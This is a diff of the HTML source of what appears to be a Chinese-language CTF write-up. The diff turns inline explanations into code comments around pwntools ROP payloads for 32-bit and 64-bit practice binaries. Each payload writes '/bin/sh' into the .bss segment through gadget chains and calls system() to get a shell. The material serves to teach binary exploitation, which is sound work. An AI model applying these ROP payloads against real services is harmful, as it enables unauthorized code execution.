@@ -574,13 +574,17 @@ $<span class="token number">5</span> <span class="token operator">=</span> <span
 mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], ebp ; ret</span>
 system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
 bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
-因为<span class="token number">32</span>位寄存器最多只能写<span class="token number">4</span>字节，而<span class="token operator">/</span>bin<span class="token operator">/</span>sh为<span class="token number">7</span>字节 所以我们分两次写入
+
+<span class="token comment" spellcheck="true">#因为32位寄存器最多只能写4字节，而/bin/sh为7字节 所以我们分两次写入</span>
+
 payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
-覆盖偏移到ret <span class="token operator">+</span> 覆盖ret为pop_edi_ebp<span class="token operator">+</span>将bss地址写入edi<span class="token operator">+</span>将<span class="token operator">/</span>bin写入ebp<span class="token operator">+</span>将ebp的内容写入bss段
+<span class="token comment" spellcheck="true">#覆盖偏移到ret + 覆盖ret为pop_edi_ebp+将bss地址写入edi+将/bin写入ebp+将ebp的内容写入bss段</span>
+
 payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
-覆盖ret到pop_edi_ebp<span class="token operator">+</span>将bss<span class="token operator">+</span><span class="token number">4</span>的地址写入edi<span class="token punctuation">(</span>因为bss段前<span class="token number">4</span>个地址写入了<span class="token operator">/</span>bin所以这里为了拼接从bss<span class="token operator">+</span><span class="token number">4</span>的位置开始写入<span class="token punctuation">)</span><span class="token operator">+</span>将<span class="token operator">/</span>sh写入ebp<span class="token operator">+</span>将ebp的内容写入bss段
+<span class="token comment" spellcheck="true">#覆盖ret到pop_edi_ebp+将bss+4的地址写入edi(因为bss段前4个地址写入了/bin所以这里为了拼接从bss+4的位置开始写入)+将/sh写入ebp+将ebp的内容写入bss段</span>
+
 payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
-覆盖返回地址为system地址<span class="token operator">+</span>写如system返回地址 可以任意写 <span class="token operator">+</span>system调用参数的地址 此处存放地址为bss
+<span class="token comment" spellcheck="true">#覆盖返回地址为system地址+写如system返回地址 可以任意写 +system调用参数的地址 此处存放地址为bss</span>
 </code></pre>
 <h3 id="所以可以得到exp"><a href="#所以可以得到exp" class="headerlink" title="所以可以得到exp"></a>所以可以得到exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -639,9 +643,12 @@ mov_ret <span class="token operator">=</span> <span class="token number">0x00000
 pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
 system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
 bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
+
 <span class="token comment" spellcheck="true">#因为64位下可写入8字节而/bin/sh为7字节所以可以一次写入</span>
 payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+
 <span class="token comment" spellcheck="true">#覆盖偏移到ret+覆盖ret为pop_r14_r15+将bss地址写入r14+将/bin/sh\x00写入r15+将r15内容写到r14(bss)处</span>
+
 payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
 <span class="token comment" spellcheck="true">#由于64位所以binsh地址参数需要放在rdi寄存器中，覆盖ret为pop_rdi+将bss地址写入rdi+写入system并调用rdi参数</span>
 </code></pre>
